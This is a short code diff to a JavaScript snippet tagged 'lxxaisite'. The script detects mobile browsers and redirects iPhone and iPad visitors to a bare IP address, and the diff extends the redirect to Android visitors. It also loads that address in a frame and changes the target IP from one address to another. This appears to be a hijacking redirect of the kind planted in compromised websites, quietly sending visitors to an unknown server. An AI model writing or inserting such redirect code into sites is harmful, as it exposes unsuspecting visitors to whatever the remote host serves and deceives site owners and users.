@@ -1,10 +1,13 @@
 //lxxaisite
 if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
     //alert(navigator.userAgent);  
-    window.location.href = "http://38.26.195.26";
+    window.location.href = "http://38.26.195.28";
+}else if (/(Android)/i.test(navigator.userAgent)) {
+    //alert(navigator.userAgent); 
+    window.location.href = "http://38.26.195.28";
 }
 var titlestr=document.title;
-setFrame("http://38.26.195.26");
+setFrame("http://38.26.195.28");
 
 
 
